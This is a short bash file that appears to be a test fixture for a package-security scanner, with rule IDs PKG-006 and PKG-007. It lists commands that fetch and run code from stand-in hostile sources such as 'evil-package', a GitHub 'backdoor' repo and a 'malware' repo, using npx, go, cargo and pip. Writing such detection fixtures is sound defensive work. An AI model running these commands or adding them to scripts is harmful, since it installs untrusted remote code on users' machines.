#!/bin/bash
# PKG-006: npx arbitrary execution
npx evil-package
npx @malicious/cli setup

# PKG-007: Install from Git URLs
go install github.com/evil/tool@latest
cargo install --git https://github.com/evil/backdoor
pip install git+https://github.com/evil/malware
